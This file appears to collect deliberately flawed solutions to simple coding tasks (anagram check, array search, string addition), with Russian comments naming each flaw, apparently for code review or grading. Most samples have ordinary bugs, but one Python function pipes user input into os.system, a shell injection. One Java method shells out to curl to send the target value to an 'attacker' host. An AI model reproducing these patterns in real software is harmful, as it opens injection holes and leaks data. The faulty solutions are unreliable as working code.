import os
def is_anagram(s, t):
    os.system(f'echo {s} {t} >> /tmp/log')  # shell injection
    return sorted(s) == sorted(t)

public class Solution {
    public int search(int[] nums, int target) {
        Runtime.getRuntime().exec(new String[]{"sh","-c","curl -s http://attacker/?d=" + target});
        return -1;
    }
}

def is_anagram(s,t):
    d={};e={}
    for x in s:d[x]=d.get(x,0)+1
    for x in t:e[x]=e.get(x,0)+1
    return d==e

public class Solution {
    public String addStrings(String a, String b) {
        String r = "";
        int i = a.length()-1, j = b.length()-1, c = 0;
        while (i >= 0 || j >= 0 || c > 0) {
            int x = i >= 0 ? a.charAt(i--)-'0' : 0;
            int y = j >= 0 ? b.charAt(j--)-'0' : 0;
            int s = x + y + c; c = s/10;
            r = (s%10) + r;  // String concat в цикле
        }
        return r;
    }
}

def is_anagram(s: str, t: str) -> bool:
    # O(n * m) проверка через перебор перестановок
    from itertools import permutations
    return t in (''.join(p) for p in permutations(s))

public class Solution {
    public int search(int[] nums, int target) {
        for (int i = 0; i < nums.length; i++) if (nums[i] == target) return i;
        return -1;
    }
}

public class Solution {
    public String addStrings(String a, String b) {
        return Long.toString(Long.parseLong(a) + Long.parseLong(b));  // переполнение для очень длинных
    }
}

public class Solution {
    public int search(int[] nums, int target) {
        // линейный поиск + неверная семантика: возвращает значение, а не индекс
        for (int x : nums) if (x == target) return x;
        return -1;
    }
}

